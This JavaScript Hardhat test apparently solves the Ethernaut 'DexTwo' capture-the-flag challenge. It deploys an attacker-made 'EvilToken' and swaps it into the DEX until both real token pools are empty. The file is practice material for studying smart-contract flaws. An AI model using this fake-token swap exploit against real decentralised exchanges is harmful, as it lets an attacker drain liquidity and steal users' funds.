const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const CONTRACT_NAME = "DexTwo";
const SWAP_TOKEN_CONTRACT_NAME = "SwappableToken";
const EVIL_TOKEN = "EVilToken";
describe(CONTRACT_NAME, function () {
  async function deployLoadFixture() {
    const [owner, attacker] = await ethers.getSigners();
    const DexTwo = await ethers.getContractFactory(CONTRACT_NAME);
    const dexTwo = await DexTwo.deploy();

    return { owner, attacker, dexTwo };
  }

  it("Challenge Solved", async function () {
    let tx;
    let { attacker, dexTwo } = await loadFixture(deployLoadFixture);
    // init the challenge
    // Deploy two Swappable Tokens(token1, et token2)
    // DexTwo holds 100 tokens of each token, the player holds 10 of each.
    const Token = await ethers.getContractFactory(SWAP_TOKEN_CONTRACT_NAME);
    const token1 = await Token.deploy(
      dexTwo.address,
      "SwappableToken",
      "SWT1",
      110
    );
    await token1.deployed();
    const token2 = await Token.deploy(
      dexTwo.address,
      "SwappableToken2",
      "SWT2",
      110
    );
    await token2.deployed();

    tx = await dexTwo.setTokens(token1.address, token2.address);
    await tx.wait();

    tx = await token1.transfer(dexTwo.address, 100);
    await tx.wait();

    tx = await token2.transfer(dexTwo.address, 100);
    await tx.wait();

    // Attack

    // Deploy the Evil Token
    const EvilToken = await ethers.getContractFactory(EVIL_TOKEN);
    const evilToken = await EvilToken.connect(attacker).deploy(400);
    await evilToken.deployed();

    // send 100 EVT to DexTwo
    tx = await evilToken.transfer(dexTwo.address, 100);
    await tx.wait();
    
    tx = await evilToken.approve(dexTwo.address, 300)
    await tx.wait()


    dexTwo = dexTwo.connect(attacker);
    tx = await dexTwo.approve(dexTwo.address, 400)
    await tx.wait()
    
    tx = await dexTwo.swap(evilToken.address, token1.address, 100);
    await tx.wait();

    tx = await dexTwo.swap(evilToken.address, token2.address, 200);
    await tx.wait();

    // check

    const dexTwoToken1Balance = await token1.balanceOf(dexTwo.address);
    const dexTwoToken2Balance = await token2.balanceOf(dexTwo.address);

    expect(dexTwoToken1Balance).to.equal(0);
    expect(dexTwoToken2Balance).to.equal(0);
  });
});
